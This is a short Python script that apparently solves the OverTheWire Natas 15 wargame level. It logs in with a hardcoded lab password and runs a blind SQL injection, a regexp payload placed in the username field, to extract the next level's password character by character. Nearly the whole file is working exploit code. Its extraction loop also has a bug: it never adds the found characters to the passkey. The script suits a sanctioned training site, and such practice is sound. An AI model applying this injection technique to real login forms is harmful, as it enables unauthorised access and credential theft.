import requests
import lxml.html

url = "http://natas15.natas.labs.overthewire.org/"
session = requests.Session()
session.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

response = session.post(url, data={"username": "natas16"})
doc = lxml.html.fromstring(response.content)
exists = doc.xpath('//div[@id="content"]/text()')[0]
print(exists)


base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

passkey = ""
for i in range(32): 
    for m in base64:
        periods = "." * i
        injection = f'natas16" and cast(password as binary) regexp "^{periods}{m}" #"'
        

        response = session.post(url, data={"username": injection})
        doc = lxml.html.fromstring(response.content)
        string = doc.xpath('//div[@id="content"]/text()')[0]
        if exists == string:
            print(m,)
            break
        
